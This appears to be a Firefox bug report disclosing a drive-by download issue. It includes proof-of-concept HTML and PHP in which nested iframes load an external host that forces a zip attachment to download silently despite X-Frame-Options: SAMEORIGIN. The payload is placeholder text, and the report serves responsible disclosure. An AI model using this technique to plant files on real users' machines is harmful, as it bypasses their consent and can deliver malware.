@@ -1,0 +1,44 @@
+drive by download ignores X-Frame-Options: SAMEORIGIN
+Created attachment 8596543
+poc.zip
+
+User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
+Build ID: 20150415140819
+
+Steps to reproduce:
+
+index.html:
+<iframe sandbox="" src="poc2.html" width="30%" scrolling="no" height="214" style=""></iframe></p>
+
+poc2.html:
+<iframe src="https://devilteam.pl/ifr.exec.php" width="30%" scrolling="no" height="200"></iframe>
+
+ifr.exec.php:
+<?php 
+header('Content-Type: application/zip; charset=utf-8;');
+header('Content-Disposition: attachment; filename="test.zip"');
+echo 'NSA Exploit';
+exit;
+?>
+
+ifr.exec.php Server have:
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-WebKit-CSP: default-src 'self'
+X-Permitted-Cross-Domain-Policies: master-only
+Strict-Transport-Security: max-age=10886400; includeSubDomains; preload
+
+
+Actual results:
+
+FireFox download file and save to default directory (downloads) without informing the user.
+
+PoC:
+https://youtu.be/bXfgIUlcFTE
+
+
+Expected results:
+
+1. FireFox should block download files because server have X-Frame-Options: SAMEORIGIN
+2. FireFox should give information about downloaded file.
